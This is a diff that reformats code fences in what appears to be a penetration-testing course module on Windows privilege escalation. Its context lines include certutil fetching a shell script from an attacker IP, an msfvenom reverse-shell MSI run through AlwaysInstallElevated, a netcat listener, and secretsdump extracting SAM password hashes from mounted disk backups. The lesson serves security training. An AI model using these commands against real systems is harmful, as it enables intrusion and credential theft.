@@ -17,8 +17,7 @@ The [LOLBAS project](https://lolbas-project.github.io/) documents binaries, scri
 
 One classic example is [certutil.exe](https://lolbas-project.github.io/lolbas/Binaries/Certutil/), whose intended use is for handling certificates but can also be used to transfer files by either downloading a file to disk or base64 encoding/decoding a file.
 
-```
-        powershell
+```powershell
 PS C:\htb> certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
 ```
 
@@ -26,8 +25,7 @@ PS C:\htb> certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat she
 
 We can use the `-encode` flag to encode a file using base64 on our Windows attack host and copy the contents to a new file on the remote system.
 
-```
-        cmd
+```bat
 C:\htb> certutil -encode file1 encodedfile
 
 Input Length = 7
@@ -39,8 +37,7 @@ CertUtil: -encode command completed successfully
 
 Once the new file has been created, we can use the `-decode` flag to decode the file back to its original contents.
 
-```
-        cmd
+```bat
 C:\htb> certutil -decode encodedfile file2
 
 Input Length = 70
@@ -67,16 +64,14 @@ This setting can be set via Local Group Policy by setting `Always install with e
 
 Let's enumerate this setting.
 
-```
-        powershell
+```powershell
 PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
 
 HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
     AlwaysInstallElevated    REG_DWORD    0x1
 ```
 
-```
-        powershell
+```powershell
 PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
 
 HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
@@ -89,8 +84,7 @@ Our enumeration shows us that the `AlwaysInstallElevated` key exists, so the pol
 
 We can exploit this by generating a malicious `MSI` package and execute it via the command line to obtain a reverse shell with SYSTEM privileges.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -104,8 +98,7 @@ Final size of msi file: 159744 bytes
 
 We can upload this MSI file to our target, start a Netcat listener and execute the file from the command line like so:
 
-```
-        cmd
+```bat
 C:\htb> msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
 ```
 
@@ -113,8 +106,7 @@ C:\htb> msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
 
 If all goes to plan, we will receive a connection back as `NT AUTHORITY\SYSTEM`.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ nc -lnvp 9443
 
 listening on [any] 9443 ...
@@ -178,8 +170,7 @@ Note: The steps above were done using the Chrome browser and may differ slightly
 
 We can use the [schtasks](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks) command to enumerate scheduled tasks on the system.
 
-```
-        cmd
+```bat
 C:\htb>  schtasks /query /fo LIST /v
  
 Folder: \
@@ -228,8 +219,7 @@ Repeat: Stop If Still Running:        N/A
 
 We can also enumerate scheduled tasks using the [Get-ScheduledTask](https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask?view=windowsserver2019-ps) PowerShell cmdlet.
 
-```
-        powershell
+```powershell
 PS C:\htb> Get-ScheduledTask | select TaskName,State
  
 TaskName                                                State
@@ -261,8 +251,7 @@ By default, we can only see tasks created by our user and default scheduled task
 
 Consider a scenario where we are on the fourth day of a two-week penetration test engagement. We have gained access to a handful of systems so far as unprivileged users and have exhausted all options for privilege escalation. Just at this moment, we notice a writeable `C:\Scripts` directory that we overlooked in our initial enumeration.
 
-```
-        cmd
+```bat
 C:\htb> .\accesschk64.exe /accepteula -s -d C:\Scripts\
  
 Accesschk v6.13 - Reports effective permissions for securable objects
@@ -285,8 +274,7 @@ We notice various scripts in this directory, such as `db-backup.ps1`, `mailbox-b
 
 Though more common in Active Directory, it is possible for a sysadmin to store account details (such as a password) in a computer or user's account description field. We can enumerate this quickly for local users using the [Get-LocalUser](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/get-localuser?view=powershell-5.1) cmdlet.
 
-```
-        powershell
+```powershell
 PS C:\htb> Get-LocalUser
  
 Name            Enabled Description
@@ -309,8 +297,7 @@ sql_dev         True
 
 We can also enumerate the computer description field via PowerShell using the [Get-WmiObject](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1) cmdlet with the [Win32\_OperatingSystem](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-operatingsystem) class.
 
-```
-        powershell
+```powershell
 PS C:\htb> Get-WmiObject -Class Win32_OperatingSystem | select Description
  
 Description
@@ -330,15 +317,13 @@ If we encounter any of these three files, we have options to mount them on eithe
 
 #### Mount VMDK on Linux
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
 ```
 
 #### Mount VHD/VHDX on Linux
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
 ```
 
@@ -352,8 +337,7 @@ For a `.vmdk` file, we can right-click and choose `Map Virtual Disk` from the me
 
 Why do we care about a virtual hard drive (especially Windows)? If we can locate a backup of a live machine, we can access the `C:\Windows\System32\Config` directory and pull down the `SAM`, `SECURITY` and `SYSTEM` registry hives. We can then use a tool such as [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py) to extract the password hashes for local users.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
 
 Impacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation
